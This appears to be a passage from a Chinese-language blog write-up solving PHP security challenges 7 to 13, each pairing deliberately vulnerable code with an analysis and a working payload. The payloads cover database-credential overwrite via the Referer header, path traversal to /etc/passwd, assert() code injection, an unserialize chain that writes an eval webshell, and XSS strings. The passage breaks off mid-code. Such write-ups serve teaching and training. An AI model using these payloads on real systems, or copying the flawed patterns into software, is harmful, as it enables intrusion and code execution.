href="#7-Bells" class="headerlink" title="7 - Bells"></a>7 - Bells</h2><blockquote><p>parse_str</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUser</span><span class="params">($id)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $config, $db;</span><br><span class="line">    <span class="keyword">if</span> (!is_resource($db)) &#123;</span><br><span class="line">        $db = <span class="keyword">new</span> MySQLi(</span><br><span class="line">            $config[<span class="string">'dbhost'</span>],</span><br><span class="line">            $config[<span class="string">'dbuser'</span>],</span><br><span class="line">            $config[<span class="string">'dbpass'</span>],</span><br><span class="line">            $config[<span class="string">'dbname'</span>]</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    $sql = <span class="string">"SELECT username FROM users WHERE id = ?"</span>;</span><br><span class="line">    $stmt = $db-&gt;prepare($sql);</span><br><span class="line">    $stmt-&gt;bind_param(<span class="string">'i'</span>, $id);</span><br><span class="line">    $stmt-&gt;bind_result($name);</span><br><span class="line">    $stmt-&gt;execute();</span><br><span class="line">    $stmt-&gt;fetch();</span><br><span class="line">    <span class="keyword">return</span> $name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$var = parse_url($_SERVER[<span class="string">'HTTP_REFERER'</span>]);</span><br><span class="line">parse_str($var[<span class="string">'query'</span>]);</span><br><span class="line">$currentUser = getUser($id);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;h1&gt;'</span>.htmlspecialchars($currentUser).<span class="string">'&lt;/h1&gt;'</span>;</span><br></pre></td></tr></table></figure><h3 id="åˆ†æ-6"><a href="#åˆ†æ-6" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p><code>parse_str()</code> æå…¶å®¹æ˜“å¯¼è‡´å˜é‡è¦†ç›–æ¼æ´ï¼Œ</p><p>å¦å¤–<code>$_SERVER[&#39;HTTP_REFERER&#39;]</code> æ˜¯å¯æ§çš„ï¼Œæ”¹ä¸‹ <code>Referer</code> å¤´å³å¯ã€‚</p><blockquote><p>è¦è·å–å½“å‰çš„ <em>QUERY_STRING</em>ï¼Œå¯ä»¥ä½¿ç”¨ <a href="https://php.net/manual/zh/reserved.variables.server.php" target="_blank" rel="noopener">$_SERVER[â€˜QUERY_STRINGâ€™]</a> å˜é‡ã€‚ </p></blockquote><p>æ³¨æ„åˆ°ç¬¬äºŒè¡Œ <code>global $config, $db</code>ï¼Œå¯ä»¥è¦†ç›–æ‰å®ƒï¼Œä»è€Œæ¥å…¥æˆ‘ä»¬çš„æ•°æ®åº“ã€‚</p><h3 id="payload-6"><a href="#payload-6" class="headerlink" title="payload"></a>payload</h3><p>ä¿®æ”¹ <code>Referer</code> å¤´</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://host/?config</span>[<span class="string">dbhost</span>]=vps<span class="emphasis">_ip&amp;config[dbuser]=root&amp;config[dbpass]=root&amp;config[dbname]=attack&amp;id=1</span></span><br></pre></td></tr></table></figure><h2 id="8-Candle"><a href="#8-Candle" class="headerlink" title="8 - Candle"></a>8 - Candle</h2><blockquote><p>preg_replace /e</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">header(<span class="string">"Content-Type: text/plain"</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complexStrtolower</span><span class="params">($regex, $value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(</span><br><span class="line">        <span class="string">'/('</span> . $regex . <span class="string">')/ei'</span>,</span><br><span class="line">        <span class="string">'strtolower("\\1")'</span>,</span><br><span class="line">        $value</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $regex =&gt; $value) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complexStrtolower($regex, $value) . <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>preg_replace()</code> çš„ <code>e</code> æ¨¡å¼å¯ä»¥ RCE</p><h3 id="åˆ†æ-7"><a href="#åˆ†æ-7" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><h2 id="9-Rabbit"><a href="#9-Rabbit" class="headerlink" title="9 - Rabbit"></a>9 - Rabbit</h2><blockquote><p>str_replace</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LanguageManager</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadLanguage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $lang = <span class="keyword">$this</span>-&gt;getBrowserLanguage();</span><br><span class="line">        $sanitizedLang = <span class="keyword">$this</span>-&gt;sanitizeLanguage($lang);</span><br><span class="line">        <span class="keyword">require_once</span>(<span class="string">"/lang/$sanitizedLang"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">getBrowserLanguage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $lang = $_SERVER[<span class="string">'HTTP_ACCEPT_LANGUAGE'</span>] ?? <span class="string">'en'</span>;</span><br><span class="line">        <span class="keyword">return</span> $lang;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizeLanguage</span><span class="params">($language)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> str_replace(<span class="string">'../'</span>, <span class="string">''</span>, $language);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> LanguageManager())-&gt;loadLanguage();</span><br></pre></td></tr></table></figure><h3 id="åˆ†æ-8"><a href="#åˆ†æ-8" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>$_SERVER[â€˜HTTP_ACCEPT_LANGUAGEâ€™]` æ˜¯å¯æ§çš„ï¼Œå¯ä»¥å°è¯•æ–‡ä»¶åŒ…å«ã€‚</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g1f3gicodej20t207dab2.jpg" alt></p><p>è¿™é‡Œçš„è¿‡æ»¤å¤ªå¼±äº†ï¼Œåªæ˜¯ç®€å•çš„æ›¿æ¢ä¸€ä¸‹ï¼Œå¯å°† <code>\/</code> éƒ½åˆ æ‰ã€‚</p><blockquote><p>å¦‚æœæ²¡æœ‰ä¸€äº›ç‰¹æ®Šçš„æ›¿æ¢éœ€æ±‚ï¼ˆæ¯”å¦‚æ­£åˆ™è¡¨è¾¾å¼ï¼‰ï¼Œä½ åº”è¯¥ä½¿ç”¨è¯¥å‡½æ•°æ›¿æ¢ <a href="https://php.net/manual/zh/function.ereg-replace.php" target="_blank" rel="noopener">ereg_replace()</a> å’Œ <a href="https://php.net/manual/zh/function.preg-replace.php" target="_blank" rel="noopener">preg_replace()</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print_r(str_replace(<span class="string">"../"</span>,<span class="string">""</span>,<span class="string">"....//"</span>));</span><br><span class="line"><span class="comment">// ../</span></span><br></pre></td></tr></table></figure><h3 id="payload-7"><a href="#payload-7" class="headerlink" title="payload"></a>payload</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Accept-Language: .<span class="regexp">//</span>....<span class="regexp">//</span>....<span class="regexp">//</span>etc<span class="regexp">/passwd</span></span><br></pre></td></tr></table></figure><h2 id="10-Anticipation"><a href="#10-Anticipation" class="headerlink" title="10 - Anticipation"></a>10 - Anticipation</h2><blockquote><p>æœªæ­£ç¡® exit</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">goAway</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    error_log(<span class="string">"Hacking attempt."</span>);</span><br><span class="line">    header(<span class="string">'Location: /error/'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($pi) || !is_numeric($pi)) &#123;</span><br><span class="line">    goAway();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!assert(<span class="string">"(int)$pi == 3"</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"This is not pi."</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"This might be pi."</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="åˆ†æ-9"><a href="#åˆ†æ-9" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>è¯¥ä»£ç çš„å¤§è‡´æ„æ€æ˜¯è¾“å…¥ä¸€ä¸ª <code>pi</code>ï¼ŒéªŒè¯æ˜¯å¦ä¸ºæ•°å­—ç±»å‹ï¼Œéæ•°å­—å°†é‡å®šå‘åˆ°é”™è¯¯é¡µé¢ã€‚</p><p><code>assert()</code> RCE å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç«  <a href="https://www.cnblogs.com/sn00py/p/5925944.html" target="_blank" rel="noopener">assertå¼•èµ·çš„ä»£ç æ³¨å°„</a>ï¼Œå¦å¤–<code>extract()</code> å¾ˆå®¹æ˜“å¼•èµ·å˜é‡è¦†ç›–ã€‚</p><h3 id="payload-8"><a href="#payload-8" class="headerlink" title="payload"></a>payload</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST</span><br><span class="line">pi=phpinfo()</span><br></pre></td></tr></table></figure><p>PS:è¿™é‡Œçš„ <code>phpinfo</code> ä¸å¤ªå¥½çœ‹åˆ°ï¼Œå†™ä¸ª <code>webshell</code> è¿›å»å†çœ‹ã€‚</p><h2 id="11-Pumpkin-Pie"><a href="#11-Pumpkin-Pie" class="headerlink" title="11 - Pumpkin Pie"></a>11 - Pumpkin Pie</h2><blockquote><p>unserialize</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $cacheFile = <span class="string">'/tmp/cachefile'</span>;</span><br><span class="line">    <span class="keyword">public</span> $template = <span class="string">'&lt;div&gt;Welcome back %s&lt;/div&gt;'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($data = null)</span> </span>&#123;</span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;loadData($data);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;render($data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadData</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (substr($data, <span class="number">0</span>, <span class="number">2</span>) !== <span class="string">'O:'</span></span><br><span class="line">            &amp;&amp; !preg_match(<span class="string">'/O:\d:\/'</span>, $data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> unserialize($data);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> [];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">createCache</span><span class="params">($file = null, $tpl = null)</span> </span>&#123;</span><br><span class="line">        $file = $file ?? <span class="keyword">$this</span>-&gt;cacheFile;</span><br><span class="line">        $tpl = $tpl ?? <span class="keyword">$this</span>-&gt;template;</span><br><span class="line">        file_put_contents($file, $tpl);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> sprintf(</span><br><span class="line">            <span class="keyword">$this</span>-&gt;template,</span><br><span class="line">            htmlspecialchars($data[<span class="string">'name'</span>])</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;createCache();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Template($_COOKIE[<span class="string">'data'</span>]);</span><br></pre></td></tr></table></figure><h3 id="åˆ†æ-10"><a href="#åˆ†æ-10" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p><code>createCache()</code> é‡Œé¢æœ‰ä¸ª <code>file_put_contents()</code> å¯ä»¥æ‹¿æ¥å†™ <code>shell</code> ï¼Œå†ç»“åˆä¸€ä¸‹ <code>__destruct()</code> æ„é€ ååºåˆ—åŒ–æ¼æ´æ¥åˆ©ç”¨ã€‚</p><p><code>loadData()</code> æœ¬æ„å¯èƒ½æ˜¯æƒ³ååºåˆ—åŒ–ä¸€ä¸ªæ•°ç»„ï¼Œæœ‰ç®€å•çš„è¿‡æ»¤ï¼Œä½†æ˜¯<code>preg_match()</code> è¿™é‡Œçš„ <code>\</code> å†™çš„æœ‰é—®é¢˜ï¼Œé€ æˆæ­£åˆ™åŒ¹é…è¿‡æ»¤å¤±æ•ˆã€‚</p><p><strong>é­”æœ¯æ–¹æ³•</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__wakeup() <span class="comment">//ä½¿ç”¨unserializeæ—¶è§¦å‘</span></span><br><span class="line">__sleep() <span class="comment">//ä½¿ç”¨serializeæ—¶è§¦å‘</span></span><br><span class="line">__destruct() <span class="comment">//å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘</span></span><br><span class="line">__call() <span class="comment">//åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</span></span><br><span class="line">__callStatic() <span class="comment">//åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</span></span><br><span class="line">__get() <span class="comment">//ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®</span></span><br><span class="line">__set() <span class="comment">//ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§</span></span><br><span class="line">__isset() <span class="comment">//åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘</span></span><br><span class="line">__unset() <span class="comment">//åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘</span></span><br><span class="line">__toString() <span class="comment">//æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘</span></span><br><span class="line">__invoke() <span class="comment">//å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘</span></span><br></pre></td></tr></table></figure><h3 id="payload-9"><a href="#payload-9" class="headerlink" title="payload"></a>payload</h3><ul><li>å°†å¯¹è±¡æ”¾åˆ°æ•°ç»„é‡Œ</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $cacheFile = <span class="string">'shell.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> $template = <span class="string">'&lt;?php eval($_GET[1]); ?&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="keyword">new</span> Template);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($arr));</span><br><span class="line"></span><br><span class="line"><span class="comment">// a:1:&#123;i:0;O:8:"Template":2:&#123;s:9:"cacheFile";s:9:"shell.php";s:8:"template";s:24:"<span class="meta">&lt;?php</span> eval($_GET[1]); <span class="meta">?&gt;</span>";&#125;&#125;</span></span><br><span class="line"><span class="comment">// å³å¯æˆåŠŸå†™å…¥ shell.php</span></span><br></pre></td></tr></table></figure><ul><li>å¦‚æœæ­£åˆ™é…ç½®æ­£ç¡®ï¼Œ<code>O:+8</code> ç»•è¿‡ <a href="https://www.phpbug.cn/archives/32.html" target="_blank" rel="noopener">phpååºåˆ—unserializeçš„ä¸€ä¸ªå°ç‰¹æ€§</a></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;O:<span class="number">8</span>:<span class="string">"Template"</span>:<span class="number">2</span>:&#123;s:<span class="number">9</span>:<span class="string">"cacheFile"</span>;s:<span class="number">9</span>:<span class="string">"shell.php"</span>;s:<span class="number">8</span>:<span class="string">"template"</span>;s:<span class="number">24</span>:<span class="string">"&lt;?php eval($_GET[1]); ?&gt;"</span>;&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="12-String-Lights"><a href="#12-String-Lights" class="headerlink" title="12 - String Lights"></a>12 - String Lights</h2><blockquote><p>htmlentities</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$sanitized = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">    $sanitized[$key] = intval($value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$queryParts = array_map(</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="params">($key, $value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $key . <span class="string">'='</span> . $value;</span><br><span class="line">&#125;, array_keys($sanitized), array_values($sanitized));</span><br><span class="line"></span><br><span class="line">$query = implode(<span class="string">'&amp;'</span>, $queryParts);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;a href='/images/size.php?"</span> .</span><br><span class="line">    htmlentities($query) . <span class="string">"'&gt;link&lt;/a&gt;"</span>;</span><br></pre></td></tr></table></figure><h3 id="åˆ†æ-11"><a href="#åˆ†æ-11" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>å…ˆçœ‹ä¸€ä¸‹è¿™ä¸¤ä¸ªå‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">implode ( string $glue , <span class="keyword">array</span> $pieces ) : string</span><br><span class="line"><span class="comment">// ç”¨ glue å°†ä¸€ç»´æ•°ç»„ä¸­çš„å€¼æ‹¼æ¥èµ·æ¥</span></span><br><span class="line">    </span><br><span class="line">htmlentities ( string $string [, int $flags = ENT_COMPAT | ENT_HTML401 [, string $encoding = ini_get(<span class="string">"default_charset"</span>) [, bool $double_encode = <span class="keyword">true</span> ]]] ) : string</span><br><span class="line"><span class="comment">// å°†å­—ç¬¦è½¬æ¢ä¸º HTML è½¬ä¹‰å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯å¯¹ä¸€äº›ç‰¹æ®Šå­—ç¬¦è¿›è¡Œ HTML å®ä½“ç¼–ç </span></span><br><span class="line"><span class="comment">// æœ¬å‡½æ•°å„æ–¹é¢éƒ½å’Œ htmlspecialchars() ä¸€æ ·ï¼Œ é™¤äº† htmlentities() ä¼šè½¬æ¢æ‰€æœ‰å…·æœ‰ HTML å®ä½“å­—ç¬¦</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„ä»£ç ç”¨çš„æ˜¯ <code>htmlentities()</code> çš„é»˜è®¤å‚æ•°</p><blockquote><p><strong>ENT_COMPAT</strong>  | ä¼šè½¬æ¢åŒå¼•å·ï¼Œä¸è½¬æ¢å•å¼•å· </p><p><strong>ENT_HTML401</strong> | ä»¥ HTML 4.01 å¤„ç†ä»£ç </p></blockquote><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸ä¼šå¯¹å•å¼•å·è¿›è¡Œå®ä½“ç¼–ç ã€‚</p><h3 id="payload-10"><a href="#payload-10" class="headerlink" title="payload"></a>payload</h3><p>å¯ä»¥æ„é€ ä¸€ä¸ªäº‹ä»¶å»è§¦å‘ xss</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">''</span> <span class="attr">onmouseover</span>=<span class="string">alert(1)</span>&gt;</span>xss<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">''</span> <span class="attr">onclick</span>=<span class="string">alert(1)</span>&gt;</span>xss<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¦‚æœç›´æ¥æäº¤</p><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">'onmouseover=alert</span>(<span class="name">1</span>)</span><br><span class="line"><span class="symbol">'onclick=alert</span>(<span class="name">1</span>)</span><br></pre></td></tr></table></figure><p>æ˜¾ç„¶æ˜¯ä¸è¡Œçš„ï¼Œ<code>alert(1)</code> å°†è¢« <code>intval</code> æ‰ï¼Œè¿™æ—¶å€™å¯ä»¥å°†ç­‰å·ç¼–ç ä¸º <code>%3D</code> ï¼Œç„¶åå†åŠ ä¸ªç­‰å·ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'onmouseover%3Dalert(1)//=1</span></span><br><span class="line"><span class="string">'</span>onclick%<span class="number">3</span>Dalert(<span class="number">1</span>)<span class="comment">//=1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// $_GET</span></span><br><span class="line"><span class="keyword">Array</span> (</span><br><span class="line">[<span class="string">'onmouseover=alert(1)//] =&gt; 1</span></span><br><span class="line"><span class="string">    ['</span>onclick=alert(<span class="number">1</span>)<span class="comment">//] =&gt; 1</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆå½¢æˆçš„ <code>payload</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">'/images/size.php?'</span><span class="attr">onmouseover</span>=<span class="string">alert(1)//</span>=<span class="string">1</span>'&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">'/images/size.php?'</span><span class="attr">onclick</span>=<span class="string">alert(1)//</span>=<span class="string">1</span>'&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¦‚æœå¯æ§ç‚¹åœ¨ <code>href</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg</span>==&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">data:text/html;%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="13-Turkey-Baster"><a href="#13-Turkey-Baster" class="headerlink" title="13 - Turkey Baster"></a>13 - Turkey Baster</h2><blockquote><p>æˆªæ–­æƒ¹çš„ç¥¸</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoginManager</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $em;</span><br><span class="line">    <span class="keyword">private</span> $user;</span><br><span class="line">    <span class="keyword">private</span> $password;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($user, $password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;em = DoctrineManager::getEntityManager();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;user = $user;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span 